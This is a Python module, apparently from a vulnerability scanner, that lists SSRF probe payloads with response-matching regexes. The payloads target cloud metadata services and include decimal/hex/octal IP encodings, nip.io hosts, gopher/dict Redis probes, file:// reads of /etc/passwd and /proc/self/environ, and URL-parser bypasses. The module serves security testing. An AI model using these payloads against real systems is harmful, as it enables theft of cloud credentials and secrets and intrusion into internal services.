"""SSRF probe library — Phase 4 cohort expansion.

Pre-expansion `scan_ssrf` shipped 6 hardcoded probes (3 cloud-metadata
hosts + file:// + 127.0.0.1 + localhost). Real-world SSRF
exploitation depends as much on **bypassing IP / scheme / URL-parser
filters** as on knowing the right internal target. A target whose
filter rejects `169.254.169.254` may still accept `2852039166`
(decimal), `0xa9fea9fe` (hex), `169.254.169.0254` (octal-tail), or
`169.254.169.254.nip.io` (wildcard-DNS). Same target, same payload —
different filter outcomes.

This module groups the expanded probe set into **families** so the
caller can:
  * Run the whole library by default.
  * Filter to specific families in time-boxed scans (e.g. cloud
    metadata only for IAM-credential-theft hypotheses).
  * Add new families without touching `scan_ssrf.py`.

## Families

  * `cloud_metadata` — direct hits on AWS / GCP / Azure / Oracle /
    DigitalOcean / Alibaba metadata services.
  * `ip_encoding` — bypass for filters that block by literal IP
    string. Decimal / hex / octal / IPv6-mapped / mixed forms of
    `127.0.0.1` and `169.254.169.254`.
  * `dns_rebinding` — wildcard-DNS providers (`nip.io`,
    `localtest.me`) that resolve to internal IPs. Bypass for
    filters that allowlist hostnames but not the resolved IP.
  * `alt_scheme` — `gopher://` and `dict://` for Redis abuse;
    SSRF-to-RCE primitive when the target service speaks plaintext.
  * `file_scheme` — `file://` for local file read when the
    consuming library accepts non-http schemes.
  * `url_parser_bypass` — `user@host` and `#@host` confusion
    between URL parsers (the host the validator parsed vs the host
    the HTTP client connects to).
  * `loopback` — bare `127.0.0.1` / `localhost`. Lowest-bypass-
    sophistication probes; left for filters that block none of
    the above.

## Fingerprint regexes

Each probe carries a regex that matches the response body when
the server successfully fetched the target. Designed to fire on
SHAPES (e.g. uid:0:0 line for /etc/passwd, `ami-id` for AWS IMDS)
rather than exact byte sequences, so the same regex works across
service versions.

## Severity

  * `critical` — cloud-metadata + file:// reach. IAM credentials,
    /etc/passwd, /proc/self/environ are direct compromise.
  * `high` — loopback / internal-service reach without immediate
    secret exposure.
"""

from __future__ import annotations

from dataclasses import dataclass


__all__ = (
    "SsrfProbe",
    "PROBES",
    "FAMILIES",
    "get_probes",
    "get_probes_by_family",
)


# Shared fingerprint regexes — DRY across probes that target the
# same internal service.

_AWS_IMDS_FP = (
    r"\b(ami-id|instance-id|iam/|security-credentials|"
    r"hostname|placement)\b"
)
_LOOPBACK_FP = (
    r"(apache2 ubuntu default|nginx welcome|phpinfo\(\)|"
    r"<title>welcome to|test page for the)"
)
_REDIS_FP = r"redis_version:|tcp_port:|process_id:|os:"
_ETC_PASSWD_FP = r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:"


@dataclass(frozen=True)
class SsrfProbe:
    """One SSRF probe — payload target, response fingerprint,
    severity, and family.

    Attributes:
        label: short identifier emitted as part of the finding
            title (`SSRF in q parameter (aws_decimal)`).
        target: the URL/scheme/path the param is set to. Empty
            for OOB-only probes (Phase 1.3 path — out of scope
            here).
        fingerprint_regex: regex applied to the response body
            (case-insensitive + multiline). Match → SSRF
            confirmed against that target.
        severity: `critical` / `high` / `medium`. Cloud-metadata
            and file:// are critical; loopback / internal-service
            reach is high.
        family: one of `FAMILIES`. Used by the caller for filtered
            cohorts (e.g. quick scans run only `cloud_metadata`).
    """

    label: str
    target: str
    fingerprint_regex: str
    severity: str
    family: str


FAMILIES: tuple[str, ...] = (
    "cloud_metadata",
    "ip_encoding",
    "dns_rebinding",
    "alt_scheme",
    "file_scheme",
    "url_parser_bypass",
    "loopback",
)


# Probe library — append-only. Adding a probe is a one-tuple change;
# `get_probes()` returns the whole list, `get_probes_by_family()`
# filters. New families need a corresponding entry in `FAMILIES`.

PROBES: tuple[SsrfProbe, ...] = (
    # ---- cloud_metadata: direct hits ----
    SsrfProbe(
        label="aws_metadata",
        target="http://169.254.169.254/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="cloud_metadata",
    ),
    SsrfProbe(
        label="aws_metadata_identity_doc",
        target="http://169.254.169.254/latest/dynamic/instance-identity/document",
        fingerprint_regex=(
            r'"accountId"\s*:|"instanceId"\s*:|"region"\s*:'
        ),
        severity="critical",
        family="cloud_metadata",
    ),
    SsrfProbe(
        label="gcp_metadata",
        target="http://metadata.google.internal/computeMetadata/v1/",
        fingerprint_regex=(
            r"\b(project-id|service-accounts|compute|metadata|"
            r"instance)\b"
        ),
        severity="critical",
        family="cloud_metadata",
    ),
    SsrfProbe(
        label="azure_metadata",
        target=(
            "http://169.254.169.254/metadata/instance?"
            "api-version=2021-02-01"
        ),
        fingerprint_regex=(
            r'\b(compute|vmId|subscription|location|tenantId)\b'
        ),
        severity="critical",
        family="cloud_metadata",
    ),
    SsrfProbe(
        label="oracle_metadata",
        target="http://169.254.169.254/opc/v2/instance/",
        fingerprint_regex=(
            r"\b(displayName|compartmentId|availabilityDomain|"
            r"fault-domain)\b"
        ),
        severity="critical",
        family="cloud_metadata",
    ),
    SsrfProbe(
        label="digitalocean_metadata",
        target="http://169.254.169.254/metadata/v1/",
        fingerprint_regex=(
            r"\bdroplet-id\b|\binterfaces/public\b|"
            r"\bregion/slug\b"
        ),
        severity="critical",
        family="cloud_metadata",
    ),
    SsrfProbe(
        label="alibaba_metadata",
        target="http://100.100.100.200/latest/meta-data/",
        fingerprint_regex=(
            r"\b(instance-id|owner-account-id|"
            r"vpc-cidr-block|region-id)\b"
        ),
        severity="critical",
        family="cloud_metadata",
    ),

    # ---- ip_encoding: AWS metadata via non-canonical IP forms ----
    SsrfProbe(
        label="aws_decimal",
        target="http://2852039166/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="aws_hex_dotted",
        target="http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="aws_hex_flat",
        target="http://0xa9fea9fe/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="aws_octal",
        target="http://0251.0376.0251.0376/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="aws_mixed_zeropad",
        target="http://169.254.169.0254/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="ip_encoding",
    ),

    # ---- ip_encoding: loopback ----
    SsrfProbe(
        label="loopback_decimal",
        target="http://2130706433/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="loopback_hex_dotted",
        target="http://0x7f.0x00.0x00.0x01/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="loopback_hex_flat",
        target="http://0x7f000001/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="loopback_octal",
        target="http://0177.0.0.1/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="ipv6_loopback",
        target="http://[::1]/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="ip_encoding",
    ),
    SsrfProbe(
        label="ipv6_mapped_loopback",
        target="http://[::ffff:127.0.0.1]/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="ip_encoding",
    ),

    # ---- dns_rebinding: wildcard-DNS-resolves-to-internal ----
    SsrfProbe(
        label="localtest_me",
        target="http://localtest.me/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="dns_rebinding",
    ),
    SsrfProbe(
        label="nip_io_loopback",
        target="http://127.0.0.1.nip.io/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="dns_rebinding",
    ),
    SsrfProbe(
        label="nip_io_aws_metadata",
        target="http://169.254.169.254.nip.io/latest/meta-data/",
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="dns_rebinding",
    ),

    # ---- alt_scheme: gopher / dict for Redis SSRF-to-RCE ----
    SsrfProbe(
        label="gopher_redis",
        target="gopher://127.0.0.1:6379/_INFO%0d%0a",
        fingerprint_regex=_REDIS_FP,
        severity="high",
        family="alt_scheme",
    ),
    SsrfProbe(
        label="dict_redis",
        target="dict://127.0.0.1:6379/INFO",
        fingerprint_regex=_REDIS_FP,
        severity="high",
        family="alt_scheme",
    ),

    # ---- file_scheme: local file read when non-http schemes accepted ----
    SsrfProbe(
        label="file_etc_passwd",
        target="file:///etc/passwd",
        fingerprint_regex=_ETC_PASSWD_FP,
        severity="critical",
        family="file_scheme",
    ),
    SsrfProbe(
        label="file_proc_self_environ",
        target="file:///proc/self/environ",
        # Common env var prefixes that leak under proc-self-environ.
        fingerprint_regex=(
            r"(PATH=|HOME=|AWS_|AZURE_|GOOGLE_|KUBE_)"
        ),
        severity="high",
        family="file_scheme",
    ),

    # ---- url_parser_bypass: parser-vs-client divergence ----
    SsrfProbe(
        label="at_bypass_aws",
        target=(
            "http://expected-host.example.com@169.254.169.254"
            "/latest/meta-data/"
        ),
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="url_parser_bypass",
    ),
    SsrfProbe(
        label="fragment_bypass_aws",
        target=(
            "http://169.254.169.254/latest/meta-data/"
            "#@expected-host.example.com"
        ),
        fingerprint_regex=_AWS_IMDS_FP,
        severity="critical",
        family="url_parser_bypass",
    ),

    # ---- loopback: bare forms ----
    SsrfProbe(
        label="loopback",
        target="http://127.0.0.1/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="loopback",
    ),
    SsrfProbe(
        label="localhost_alt",
        target="http://localhost:80/",
        fingerprint_regex=_LOOPBACK_FP,
        severity="high",
        family="loopback",
    ),
)


def get_probes() -> tuple[SsrfProbe, ...]:
    """Return the full probe library. Most callers want this."""
    return PROBES


def get_probes_by_family(*families: str) -> tuple[SsrfProbe, ...]:
    """Filter the library to entries whose `family` is in `families`.

    Empty `families` returns `()` — distinct from `get_probes()`
    which returns the full library. Unknown family names match
    nothing (no error).
    """
    if not families:
        return ()
    family_set = frozenset(families)
    return tuple(p for p in PROBES if p.family in family_set)
